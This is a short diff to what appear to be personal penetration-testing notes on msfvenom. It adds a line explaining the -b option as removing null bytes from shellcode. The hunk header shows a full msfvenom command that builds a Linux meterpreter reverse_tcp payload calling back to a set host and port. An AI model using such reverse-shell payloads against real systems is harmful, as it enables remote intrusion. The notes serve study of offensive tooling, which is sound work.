@@ -68,6 +68,7 @@ sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.71 LPORT=666 
 
 - **Msfvenom Syntax**
   - -p payload name
+  - -b delete nul bites from shellcode
   - -a payload arch
   - -f payload format
   - -o write output to a file 
